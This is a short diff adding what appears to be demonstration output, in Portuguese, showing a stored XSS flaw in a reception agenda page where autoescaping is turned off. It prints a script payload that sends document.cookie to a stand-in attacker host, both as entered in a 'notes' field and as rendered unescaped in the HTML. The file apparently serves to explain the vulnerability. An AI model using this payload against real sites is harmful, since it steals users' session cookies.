@@ -1,0 +1,8 @@
+>>> Payload malicioso inserido no campo 'notes':
+<script>fetch('https://atacante.example/roubo?c='+document.cookie)</script>
+
+>>> Trecho do HTML gerado com autoescape DESLIGADO (versão vulnerável):
+<td><script>fetch('https://atacante.example/roubo?c='+document.cookie)</script></td>
+
+*** RESULTADO: a tag <script> foi parar no HTML sem escape. ***
+*** Qualquer recepcionista que abrisse /reception/agenda executaria esse JS. ***
